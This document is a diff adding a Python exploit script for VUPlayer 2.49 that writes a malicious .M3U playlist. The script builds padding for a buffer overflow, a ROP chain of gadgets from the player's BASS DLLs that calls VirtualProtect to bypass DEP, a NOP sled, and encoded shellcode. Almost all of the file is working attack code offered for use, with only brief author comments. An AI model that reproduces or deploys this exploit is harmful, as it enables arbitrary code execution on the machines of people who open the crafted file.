@@ -1,0 +1,148 @@
+# VUPlayer 2.49 (.M3U) Exploit(Universal buffer overflow/DEP bypass)
+# Download: http://vuplayer.com/
+# Tested on Wind0ws XP SP3 DEP:OptOut
+# Author: Lu_c_fer ------>>> Lu_c_fer@aol.com(feel free to tell me your ideas!! :))
+
+# All the Gadgets are from APP's DLLs(I could only use the addresses that doesnt start with null) 
+
+
+
+import struct
+
+p = open("Exploit_VirtualProtect.m3u", "w")
+
+crash = "\x41" * 1012
+
+sc = ("\x89\xe1\xd9\xee\xd9\x71\xf4\x58\x50\x59\x49\x49\x49\x49"
+"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56"
+"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41"
+"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42"
+"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a"
+"\x48\x47\x34\x43\x30\x45\x50\x45\x50\x4c\x4b\x51\x55\x47"
+"\x4c\x4c\x4b\x43\x4c\x45\x55\x42\x58\x45\x51\x4a\x4f\x4c"
+"\x4b\x50\x4f\x45\x48\x4c\x4b\x51\x4f\x51\x30\x43\x31\x4a"
+"\x4b\x51\x59\x4c\x4b\x50\x34\x4c\x4b\x43\x31\x4a\x4e\x46"
+"\x51\x49\x50\x4c\x59\x4e\x4c\x4d\x54\x49\x50\x42\x54\x45"
+"\x57\x49\x51\x49\x5a\x44\x4d\x43\x31\x48\x42\x4a\x4b\x4c"
+"\x34\x47\x4b\x50\x54\x47\x54\x45\x54\x43\x45\x4b\x55\x4c"
+"\x4b\x51\x4f\x47\x54\x45\x51\x4a\x4b\x45\x36\x4c\x4b\x44"
+"\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x43\x31\x4a\x4b\x4c"
+"\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4c\x49\x51\x4c\x46"
+"\x44\x44\x44\x48\x43\x51\x4f\x50\x31\x4a\x56\x45\x30\x50"
+"\x56\x42\x44\x4c\x4b\x51\x56\x50\x30\x4c\x4b\x51\x50\x44"
+"\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x43\x58\x45"
+"\x58\x4b\x39\x4a\x58\x4d\x53\x49\x50\x42\x4a\x50\x50\x43"
+"\x58\x4a\x50\x4d\x5a\x44\x44\x51\x4f\x45\x38\x4a\x38\x4b"
+"\x4e\x4c\x4a\x44\x4e\x50\x57\x4b\x4f\x4d\x37\x42\x43\x43"
+"\x51\x42\x4c\x42\x43\x43\x30\x41\x41")
+
+#---------------------------Setting 0x00000201 into EBX---------------------------- 
+rop = struct.pack('<L',0x10015f77)  # POP EAX # RETN
+rop += struct.pack('<L',0x5f5f01ff)
+rop += struct.pack('<L',0x1001e453)  # SUB EAX,5F5EFFFE # RETN 0x04
+rop += struct.pack('<L',0x1003a084)
+rop += struct.pack('<L',0x42424242)
+rop += struct.pack('<L',0x1001033f)  # INC EAX # RETN
+rop += struct.pack('<L',0x100110ff)  # POP EBX # RETN   [BASS.dll]
+rop += struct.pack('<L',0xffffffff)  #
+rop += struct.pack('<L',0x10015ef2)  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN
+
+#---------------------------Setting the pinter to the VirtualProtect into ESI---------------------------- 
+
+rop += struct.pack('<L',0x10015f77)  # POP EAX # RETN   
+rop += struct.pack('<L',0x10109270)  # ptr to &VirtualProtect()   [IAT BASSWMA.dll]
+rop += struct.pack('<L',0x1001eaf1)  # MOV EAX,DWORD PTR DS:[EAX] # RETN   [BASS.dll] 
+rop += struct.pack('<L',0x10030950)  # XCHG EAX,ESI # RETN   [BASS.dll] 
+
+#---------------------------Setting 0x00000040 into EDX(*******TRUST ME IT WAS THE ONLY WAY!!! :)******)---------------------------- 
+rop += struct.pack('<L',0x1004041c)  # POP EDX # RETN   [BASS.dll] 
+rop += struct.pack('<L',0xffffffff)
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+rop += struct.pack('<L',0x100332eb)  # INC EDX # RETN
+# EDX is now 0x00000040
+
+
+rop += struct.pack('<L',0x10010157)  # POP EBP # RETN   [BASS.dll] 
+rop += struct.pack('<L',0x1010539f)  # & jmp esp   [BASSWMA.dll]
+
+rop += struct.pack('<L',0x10601007)  # POP ECX # RETN   [BASSMIDI.dll] 
+rop += struct.pack('<L',0x101087c3)  # &Writable location   [BASSWMA.dll]
+
+rop += struct.pack('<L',0x100190b0)  # POP EDI # RETN   [BASS.dll] 
+rop += struct.pack('<L',0x1003a084)  # RETN (ROP NOP)   [BASS.dll]
+
+rop += struct.pack('<L',0x10015fe7)  # POP EAX # RETN   [BASS.dll] 
+rop += struct.pack('<L',0x90909090)  # &Writable location
+
+rop += struct.pack('<L',0x1001d7a5)  # PUSHAD # RETN   [BASS.dll]
+
+nop = "\x90"*40
+
+payload = crash + rop + nop + sc
+ 
+
+p.write(payload)
+p.close()
